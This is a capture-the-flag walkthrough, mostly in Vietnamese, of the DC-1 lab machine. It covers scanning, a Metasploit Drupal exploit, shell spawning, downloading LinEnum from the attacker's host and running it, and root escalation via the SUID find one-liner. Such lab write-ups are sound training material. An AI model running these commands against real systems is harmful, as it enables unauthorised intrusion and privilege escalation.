# DC 1

```bash
arp-scan -l
```

![alt text](IMG/DC-1/image.png)

```bash
nmap -p- -sV 172.16.1.129
```

![alt text](IMG/DC-1/image-1.png)

![alt text](IMG/DC-1/image-8.png)

```bash
gobuster dir -u http://172.16.1.129 -w /usr/share/wordlists/dirb/common.txt
```

![alt text](IMG/DC-1/image-5.png)

```bash
nikto -h http://172.16.1.129
```

```bash
searchsploit drupal
```

![alt text](IMG/DC-1/image-7.png)

```bash
msfconsole
```

![alt text](IMG/DC-1/image-9.png)

```bash
msf6 > search drupal
```

![alt text](IMG/DC-1/image-10.png)

```
set rhosts 172.16.1.129
run
```

![alt text](IMG/DC-1/image-11.png)

```bash
ls
cat flag1.txt
```

![alt text](IMG/DC-1/image-12.png)

```bash
cd /home
ls
```

![alt text](IMG/DC-1/image-13.png)

```bash
cd flag4
ls
cat flag4.txt
```

![alt text](IMG/DC-1/image-14.png)

```bash
cat /etc/passwd
```

![alt text](IMG/DC-1/image-15.png)

```bash
shell
/bin/bash -i
# hoặc 
# python -c 'import pty; pty.spawn("/bin/sh")'
# /bin/bash -i
```

Tham khảo [shell](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell).

![alt text](IMG/DC-1/image-16.png)

```bash
ls
sudo -l
```

![alt text](IMG/DC-1/image-17.png)

Không có sudo.

```bash
cd /tmp
ls
ls -all
```

![alt text](IMG/DC-1/image-19.png)

Tiếp theo chúng ta sử dụng `LinEnum` để kiểm kê toàn bộ máy Linux sau khi đã có foothold, nhằm tìm cách privilege escalation. Tham khảo tại [đây](https://github.com/rebootuser/LinEnum)

Mở một tab khác của kali:

```bash
cd /home/kali/Downloads
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
python -m http.server
```

![alt text](IMG/DC-1/image-21.png)

Quay lại meterprefer:

```bash
cd /tmp
wget http://172.16.1.128:8000/LinEnum.sh
```

![alt text](IMG/DC-1/image-20.png)

```bash
ls -l
```

![alt text](IMG/DC-1/image-22.png)

```bash
chmod +x 
ls -l
```

![alt text](IMG/DC-1/image-23.png)

```bash
./LinEnum.sh
```

![alt text](IMG/DC-1/image-24.png)

Sau Khi quét xong ta thấy có nhiều thư mục và các thông tin hữu ích như vị trí và nội dung có thể truy cập hay là các thư mục mail:

![alt text](IMG/DC-1/image-25.png)

Trong rất nhiều thông tin ta tìm được một thông tin hữu ích như sau:

![alt text](IMG/DC-1/image-26.png)

`find` bình thường là lệnh dùng để tìm file trên Linux. Nhưng ở đây điều đáng chú ý không phải là tên file, mà là quyền của nó.

```txt
- rw s r-x r-x
| |   |   |
| |   |   └── quyền của others
| |   └────── quyền của group
| └────────── quyền của owner
└──────────── loại file
```

`rwx` = owner có read/write/execute.

`rws` = owner có read/write/execute và có SUID.

`SUID` = Set User ID, tức là khi một file thực thi có bit SUID bật, lúc user thường chạy file đó, tiến trình được tạo ra sẽ chạy với effective UID của owner file, không phải UID của người chạy.

Trong TH này file thuộc `root` -> file có `SUID` -> nên khi ai đó chạy `/usr/bin/find`, tiến trình find có thể chạy với quyền hiệu lực của `root`.

Tham khảo câu lệnh Linux tại [đây](https://gtfobins.org/).

Như vậy thì find có quyền root nên ta sẽ thực hiện câu lệnh mở shell và lúc này shell sẽ có quyền root.

```bash
whoami
find . -exec /bin/sh \; -quit
whoami
```

![alt text](IMG/DC-1/image-27.png)

```bash
cd /root
cat thefinalflag.txt
```

![alt text](IMG/DC-1/image-29.png)